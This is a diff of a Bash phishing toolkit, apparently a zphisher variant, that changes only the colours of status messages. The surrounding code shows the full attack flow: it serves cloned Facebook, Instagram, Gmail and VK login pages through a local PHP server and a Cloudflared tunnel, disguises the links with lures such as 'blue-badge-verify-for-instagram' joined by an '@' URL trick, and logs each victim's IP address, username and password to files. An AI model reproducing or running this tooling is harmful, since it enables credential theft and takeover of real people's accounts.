@@ -39,12 +39,12 @@ fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+    { printf "\n\n%s\n\n" "${RED}[${BLUE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
     exit 0
 }
 
 exit_on_signal_SIGTERM() {
-    { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated. Thank you for using & Happy Hacking" 2>&1; reset_color; }
+    { printf "\n\n%s\n\n" "${RED}[${BLUE}!${RED}]${RED} Program Terminated. Thank you for using & Happy Hacking" 2>&1; reset_color; }
     exit 0
 }
 
@@ -130,7 +130,7 @@ dependencies() {
 				elif [[ `command -v dnf` ]]; then
 					sudo dnf -y install "$pkg"
 				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
+					echo -e "\n${RED}[${BLUE}!${RED}]${RED} Unsupported package manager, Install packages manually."
 					{ reset_color; exit 1; }
 				fi
 			}
@@ -152,7 +152,7 @@ download_cloudflared() {
 		mv -f "$file" .server/cloudflared > /dev/null 2>&1
 		chmod +x .server/cloudflared > /dev/null 2>&1
 	else
-		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured, Install Cloudflared manually."
+		echo -e "\n${RED}[${BLUE}!${RED}]${RED} Error occured, Install Cloudflared manually."
 		{ reset_color; exit 1; }
 	fi
 }
@@ -212,10 +212,10 @@ about() {
 		99)
 			msg_exit;;
 		0 | 00)
-			echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Returning to main menu..."
+			echo -ne "\n${GREEN}[${BLUE}+${GREEN}]${CYAN} Returning to main menu..."
 			{ sleep 1; main_menu; };;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; about; };;
 	esac
 }
@@ -225,10 +225,10 @@ HOST='127.0.0.1'
 PORT='8080'
 
 setup_site() {
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
+	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} Setting up server..."${WHITE}
 	cp -rf .sites/"$website"/* .server/www
 	cp -f .sites/ip.php .server/www/
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
+	echo -ne "\n${RED}[${BLUE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
 }
 
@@ -236,8 +236,8 @@ setup_site() {
 capture_ip() {
 	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
+	echo -e "\n${RED}[${BLUE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
+	echo -ne "\n${RED}[${BLUE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
 	cat .server/www/ip.txt >> ip.txt
 }
 
@@ -246,25 +246,25 @@ capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
 	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
+	echo -e "\n${RED}[${BLUE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+	echo -e "\n${RED}[${BLUE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
 	cat .server/www/usernames.txt >> usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${BLUE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${BLUE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${RED}[${BLUE}-${RED}]${GREEN} Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${RED}[${BLUE}-${RED}]${GREEN} Login info Found !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
@@ -279,9 +279,9 @@ capture_data() {
 ## Start Cloudflared
 start_cloudflared() { 
         rm .cld.log > /dev/null 2>&1 &
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}https://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${BLUE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}https://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${BLUE}-${RED}]${GREEN} Launching Cloudflared..."
 
     if [[ `command -v termux-chroot` ]]; then
 		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
@@ -293,8 +293,8 @@ start_cloudflared() {
 	
 	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
 	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
+	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
+	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
 	echo -e "\n If you are getting Argo Tunnel Error in the above links,please wait atleast 1 minute for the site to come alive."
 	capture_data
 }
@@ -308,7 +308,7 @@ tunnel_menu() {
 
 	EOF
 
-	echo "${RED}[${WHITE}-${RED}]${GREEN} Starting port forwarding by Cloudflared${BLUE}"
+	echo "${RED}[${BLUE}-${RED}]${GREEN} Starting port forwarding by Cloudflared${BLUE}"
 	start_cloudflared
 	
 	
@@ -326,7 +326,7 @@ site_facebook() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${BLUE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -346,7 +346,7 @@ site_facebook() {
 			mask='https://get-messenger-premium-features-free'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_facebook; };;
 	esac
 }
@@ -362,7 +362,7 @@ site_instagram() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${BLUE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -382,7 +382,7 @@ site_instagram() {
 			mask='https://blue-badge-verify-for-instagram'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_instagram; };;
 	esac
 }
@@ -397,7 +397,7 @@ site_gmail() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${BLUE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -413,7 +413,7 @@ site_gmail() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_gmail; };;
 	esac
 }
@@ -427,7 +427,7 @@ site_vk() {
 
 	EOF
 
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	read -p "${RED}[${BLUE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
 		1 | 01)
@@ -439,7 +439,7 @@ site_vk() {
 			mask='https://vote-for-the-best-social-media'
 			tunnel_menu;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; clear; banner_small; site_vk; };;
 	esac
 }
@@ -603,7 +603,7 @@ main_menu() {
 		0 | 00 )
 			msg_exit;;
 		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
 	
 	esac
